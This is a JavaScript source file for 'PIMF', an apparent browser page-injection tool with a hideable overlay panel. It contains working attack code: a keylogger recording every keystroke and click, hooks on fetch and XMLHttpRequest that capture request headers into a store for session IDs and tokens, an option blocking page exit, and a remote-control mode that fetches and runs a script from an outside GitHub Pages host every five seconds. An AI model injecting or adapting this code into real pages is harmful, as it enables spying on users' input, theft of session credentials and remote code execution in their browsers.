/*
                            P I M F

            Page Interception and Manipulation Framework
        ----------------------------------------------------


    (c) PhiXi, 2026 (github.com/phi-xi)

    License: opensource.org/license/mit

*/

const Q = ( function(){

    const
        api_name = "PIMF",
        version  = "1.27";


    function request( url, method, headers, body=false ){
        return new Promise( async ( resolve, reject ) => {
            try {
                let result = false,
                req = {
                    method:     method,
                    headers:    headers
                };
                if ( body ){
                    req.body = body;
                }
                const response = await fetch( url, req );
                if ( !response.ok ){
                    throw new Error( `Response status: ${response.status}` );
                }
                const response_clone = response.clone();
                try {
                    result = await response.json();
                } catch( e ){
                    result = await response_clone.text();
                }
                resolve( result );
            } catch ( error ){
                reject( error.message );
            }
        } );
    }
    function _msg( txt, add_button ){
        let m = mk( "div",
                    "q-msg",
                    {
                        style: "font-family:"
                                + this
                                + ";"
                    },
                    txt + "<br><br>" );
        if ( add_button ){
            let b = get_button( "OK", function(){
                document.body.removeChild( m );
            } );
            b.style.marginLeft = "45%";
            m.appendChild( b );
        } else {
            m.style.textAlign = "center";
        }
        document.body.appendChild( m );
        return m;
    }
    let msg = _msg.bind( "Ubuntu" );
    function load_script( url ){
        let e = mk( "script", false, {
            src:  url,
            type: "text/javascript"
        } );
        document.body.appendChild( e );
        setTimeout( ()=>{
            document.body.removeChild( e );
        }, 3000 );
    }
    function mk( ename, cname, attr={}, text="" ){
        let e = document.createElement( ename );
        if ( cname ){
            e.className = cname;
        }
        if ( text != "" ){
            e.innerHTML = text;
        }
        for ( let aname in attr ){
            e.setAttribute( aname,
                            attr[ aname ] );
        }
        return e;
    }
    function get_button( name, callback ){
        let b = mk( "button", "q-btn" );
        b.innerHTML = name;
        b.addEventListener( "click", callback );
        return b;
    }
    function get_checkbox( name, callback ){
        let wrap     = mk( "div", "q-checkbox-wrap q-inline" ),
            label    = mk( "label",
                            "q-label q-inline",
                            {
                                for: name
                            } ),
            checkbox = mk( "input",
                            "q-checkbox q-inline",
                            {
                                name: name,
                                type: "checkbox"
                            } );
        label.innerHTML = name;
        wrap.appendChild( checkbox );
        wrap.appendChild( label );
        checkbox.addEventListener( "change", callback );
        return wrap;
    }
    function unix_time_now(){
        return Math.round( new Date().getTime() / 1000 );
    }
    function add_to_set_array( element, array ){
        if ( array.includes( element ) ) return false;
        array.push( element );
        return true;
    }

    function _log_click( e ){
        Q.data.log.events.clicks.push( {
            time:   unix_time_now() - init_time,
            target: e.target.nodeName,
            text:   e.target.textContent
        } );
        refresh();
    }
    function _log_keypress( e ){
        let t = unix_time_now() - init_time,
            k = e.key;
            if ( e.key == "Enter" ) k = "ENTER";
            Q.data.log.events.keys.push( {
                time:   unix_time_now(),
                key:    k,
                target: e.target.nodeName
            } );
        refresh();
    }
    function _checkbox_transparent(){
        details.style.opacity =
            this.checked ? opacity : 1;
    }
    function _checkbox_monospace(){
        let css = ".q-bar,.q-box,.q-btn,.q-input,.q-checkbox,.q-textarea,.q-msg{font-family:monospace;}",
            style = Q.mk( "style", "", {}, css );
        document.body.appendChild( style );
        this.disabled = true;
    }
    function _checkbox_interept(){
        if ( !this.checked ){
            Q.intercept.stop();
        } else {
            Q.intercept.start( (type, url, opts)=>{} );
        }
    }
    function _checkbox_lock(){
        if ( !this.checked ){
            window.onbeforeunload = null;
        } else {
            window.onbeforeunload = (e)=>{
                e.preventDefault();
            };
        }
    }
    function _checkbox_select(){
        if ( !this.checked ){
            if ( selector === null ) return;
            window.removeEventListener( "click", selector );
            selector = null;
        } else {
            selector = window.addEventListener( "click", (e)=>{
                const t = e.target;
                t.style.border = "solid 2px var(--orange-lite)";
                setTimeout( ()=>{
                    t.style.border = "";
                }, 500 );
            } );
        }
    }
    function _checkbox_log(){
        window.addEventListener( "click",   _log_click );
        window.addEventListener( "keydown", _log_keypress );
        this.disabled = true;
    }
    function _checkbox_rc(){
        if ( !this.checked ){
            if ( rc !== null ){
                clearInterval( rc );
                rc = null;
            }
        } else {
            if ( rc === null ){
                rc = setInterval( ()=>{
                    load_script( url_rctrl + "?"
                        + unix_time_now().toString() );
                }, sync_rate );
            }
        }
    }
    function _button_visibility(){
        Q.gui.hide();
        Q.gui.dialog
            .toast( "Move mouse to top left corner to show PIMF" );
    }
    function _button_exit(){
        Q.exit();
    }

    function init(){
        style.innerHTML = css;
        document.body.appendChild( link );
        document.body.appendChild( style );
        let checkboxes = [
            get_checkbox( "transparent", _checkbox_transparent ),
            get_checkbox( "monospace",   _checkbox_monospace ),
            get_checkbox( "intercept",   _checkbox_interept ),
            get_checkbox( "lock",        _checkbox_lock ),
            get_checkbox( "select",      _checkbox_select ),
            get_checkbox( "log",         _checkbox_log ),
            get_checkbox( "RC",          _checkbox_rc )
        ];
        let bottons = [
            get_button( "Hide", _button_visibility ),
            get_button( "Exit", _button_exit )
        ];
        details.style.opacity = 1;
        summary.innerHTML = title;
        for ( let i=0; i < checkboxes.length; i++ )
            summary.appendChild( checkboxes[ i ] );
        for ( let i=0; i < bottons.length; i++ )
            summary.appendChild( bottons[ i ] );
        details.appendChild( summary );
        details.appendChild( box_cli );
        box_cli.appendChild( input_cli );
        details.appendChild( box_post );
        details.appendChild( box_get );
        details.appendChild( box_header );
        details.appendChild( box_keylog );
        document.body.appendChild( details );
        box_header.style.height
            = box_keylog.style.height = "30vh";
        box_cli.style.width     = "90vw";
        box_cli.style.height    = "10vh";
        summary.lastChild.style.backgroundColor = "var(--orange)";
        summary.lastChild.style.borderColor = "var(--orange-lite)";
        setTimeout ( ()=>{
            Q.gui.dialog.toast( "Injection complete", 2 );
        }, 10 );
        window.addEventListener( "mousemove", (e)=>{
            if ( e.clientX + e.clientY < 10 ){
                Q.gui.show();
            }
        } );
        input_cli.addEventListener( "keydown", (e)=>{
            if ( e.keyCode == 13 ){
                const cmd = input_cli.value.split( " " );
                request( cmd[1], cmd[0], JSON.parse(cmd[2]), cmd[3] )
                    .then(
                        (r)=>{
                            input_cli.value = "";
                            let m = r.replace( /\&/g, "&amp;" )
                                     .replace( /\</g, "&lt;" )
                                     .replace( /\>/g, "&gt;" );
                            msg.bind( "monospace" )( m, true ); },
                        (r)=>{
                            msg.bind( "monospace" )( cmd[0]
                                    + "  request to  "
                                    + cmd[1]
                                    + "  failed with status  "
                                    + r.split( ":" )[1] );
                        } );
            }
        } );
    }
    function refresh(){
        box_header.innerHTML = Q.data.log.headers.join("<br>");
        let k = Q.data.log.events.keys,
            t = "";
        for ( let i=0; i < k.length; i++ ){
            t += k[ i ].key + ".";
        }
        box_keylog.innerHTML = t;
    }

    const
        original_fetch_constructor    = fetch.constructor.prototype,
        original_xhr_open             = XMLHttpRequest
                                            .prototype.open,
        original_xhr_setRequestHeader = XMLHttpRequest
                                            .prototype.setRequestHeader,
        url_font  = "https://fonts.googleapis.com/css?family=Ubuntu",
        tsep      = " | ",
        title     = "<span style='color:var(--green-lite);'>&Phi;&Xi;"
                        + tsep
                        + api_name
                        + "<span style='color:var(--green);font-size:0.6em;'>"
                        + tsep
                        + version
                        + "</span></span>",
        sync_rate = 5 * 1000,
        opacity   = 0.7,
        init_time = unix_time_now(),
        style     = mk( "style",    false ),
        summary   = mk( "summary",  "q-bar-title" ),
        details   = mk( "details",  "q-bar" ),
        bar_title = mk( "div",      "q-bar-title" ),
        box_cli   = mk( "div",      "q-box q-cli q-inline" ),
        input_cli = mk( "input",    "q-box q-input", {
            placeholder: "Type HTTP command and execute with ENTER. Syntax: "
                            + "<GET|POST> <url> <header_JSON> <body>"
        } ),
        box_get   = mk( "div",      "q-box q-inline" ),
        box_post  = mk( "div",      "q-box q-inline" ),
        box_header= mk( "div",      "q-box q-inline" ),
        box_keylog= mk( "div",      "q-box q-inline" ),
        link      = mk( "link",     "",
                                    {
                                        rel: "stylesheet",
                                        href: url_font } );
        const css = "";


    let url_rctrl = "https://phi-xi.github.io/src/js/pimf/rc.js",
        locker      = null,
        rc          = null,
        proc_id     = null,
        selector    = null;


    init();


    return {

        data: {
            log: {
                events: {
                    clicks: [],
                    keys: []
                },
                credentials: {
                    session_ids: [],
                    tokens: []
                },
                headers: []
            }
        },

        gui: {
            show: function(){
                details.style.display = "";
            },
            hide: function(){
                details.style.display = "none";
            },
            dialog: {
                message: function( txt ){
                    msg( txt, true );
                },
                msg: function( txt ){
                    msg( txt, true );
                },
                toast: function( txt, duration=3 ){
                    let m = msg( txt, false );
                    setTimeout( ()=>{
                        document.body.removeChild( m );
                    }, 1000 * duration );
                }
            }
        },

        rc: {
            get_proc_id: function(){
                return proc_id;
            },
            set_proc_id: function( pid ){
                proc_id = pid;
            }
        },

        load_script: function( url ){
            load_script( url );
        },

    // TODO intercept form requests
        intercept: {
            start: function( callback, block_request=false ){
                fetch.constructor.prototype = function( url, options ){
                    callback( "FETCH", url, options );
                    let b = options.method == "GET" ? box_get : box_post;
                    b.innerHTML += "<br><div style='color:var(--cyan);font-weight:bold;'>"
                                        + options.method.toUpperCase()
                                        + "<br>"
                                        + JSON.stringify( options )
                                        + "</div> "
                                        + url;
                    if ( !block_request ){
                        original_fetch_constructor.apply( this, arguments );
                    }
                    add_to_set_array( JSON.stringify( options.headers ),
                                      Q.data.log.headers );
                    refresh();
                };
                XMLHttpRequest.prototype.open = function( method, url ){
                    callback( "XHR", url, method );
                    let b = method == "GET" ? box_get : box_post;
                    b.innerHTML += "<br><div style='color:var(--cyan);font-weight:bold;'>"
                                        + method.toUpperCase()
                                        + "</div> "
                                        + url;
                    original_xhr_open.apply( this, arguments );
                };
                XMLHttpRequest.prototype.setRequestHeader = function( header, value ){
                    add_to_set_array( header + ": " + value,
                                      Q.data.log.headers );
                    original_xhr_setRequestHeader.apply( this, arguments );
                    refresh();
                };
            },
            stop: function(){
                fetch.constructor.prototype       = original_fetch_constructor;
                XMLHttpRequest.prototype.open     = original_xhr_open;
                XMLHttpRequest.prototype
                                .setRequestHeader = original_xhr_setRequestHeader;
            }
        },

        request: function( url, method, headers, body=false ){
            return request( url, method, headers, body );
        },

        send: function( url, headers={} ){
            return {
                get: function(){
                    return request( url, "GET", headers, false );
                },
                post: function( data ){
                    return request( url, "POST", headers, data );
                }
            };
        },

        r: function( n ){
            return document.getElementById( n )
                || document.getElementsByClassName( n )
                || document.getElementsByTagName( n );
        },
        mk: function( ename, cname, attr={}, text="" ){
            return mk( ename, cname, attr, text );
        },

        aux: {
            extract_video: function(){
                const url = document.getElementsByClassName("fp-engine")[0].getAttribute("src");
                document.write("<a id='q-link' href='" + url + "' target='_blank'>Download video</a>");
                setTimeout( ()=>{
                    document.getElementById('q-link').click();
                },1000 );
            },
            delete_element: function(){
                //TODO
            }
        },

        exit: function(){
            document.body.removeChild( details );
        }

    };

} )();
